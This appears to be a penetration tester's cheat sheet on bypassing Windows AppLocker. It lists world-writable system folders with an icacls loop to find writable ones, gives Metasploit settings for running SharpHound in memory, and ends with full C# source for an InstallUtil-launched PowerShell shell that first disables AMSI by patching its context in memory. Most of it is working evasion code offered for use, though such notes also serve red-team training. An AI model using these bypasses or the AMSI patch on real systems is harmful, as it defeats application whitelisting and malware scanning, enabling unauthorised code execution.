# AppLocker CockBlocker

- Bascially makes life a pain in the ass by preventing execution of your favourite executables unless they are in whitelisted location

Reference: (https://juggernaut-sec.com/applocker-bypass/)

## Checking if AppLocker is live

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Check if Default World-Writeable Folders are well Writable for your User

Compile the following into a txt file

```
C:\Windows\Tasks 

C:\Windows\Temp 

C:\windows\tracing

C:\Windows\Registration\CRMLog

C:\Windows\System32\FxsTmp

C:\Windows\System32\com\dmp

C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys

C:\Windows\System32\spool\PRINTERS

C:\Windows\System32\spool\SERVERS

C:\Windows\System32\spool\drivers\color

C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\System32\Tasks_Migrated

C:\Windows\SysWOW64\FxsTmp

C:\Windows\SysWOW64\com\dmp

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter

C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

Then on a cmd prompt, run the following script to see which folders you have Write perms

```cmd
for /F %A in (C:\temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 
```

## Via ADS



##  Via God-Tier Meterpreter's Post Exploit Module Execute dotnet Assembly

https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/manage/execute_dotnet_assembly.md

```
set SESSION 1

set DOTNET_EXEC <path to the exe you want executed>

set ARGUMENTS <the flags and commands you will pass to the DOTNET_EXEC>

# For example, if i want to run sharphound.exe

set DOTNET_EXEC ./SharpHound.exe

set ARGUMENTS -c ALL --outputdirectory C:\Users\Public
```


## Interactive CInstaller Bypassess AMSI

- Use with InstallUtil

```powershell
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;


namespace CInstaller
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd;
            Runspace rs = RunspaceFactory.CreateRunspace();
            PowerShell ps = PowerShell.Create();
            rs.Open();
            ps.Runspace = rs;

            // disable amsi
            ps.AddScript(@"$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "" * iUtils"") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "" * Context"") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)");
            ps.Invoke();

            while (true)
            {
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
                Stream inputStream = Console.OpenStandardInput();

                cmd = Console.ReadLine();

                if (String.Equals(cmd, "exit"))
                    break;

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(cmd);

                pipeline.Commands.Add("Out-String");

                try
                {
                    Collection<PSObject> results = pipeline.Invoke();
                    StringBuilder stringBuilder = new StringBuilder();

                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }

                    Console.WriteLine(stringBuilder.ToString().Trim());
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }


            }

            rs.Close();
        }
    }

}
```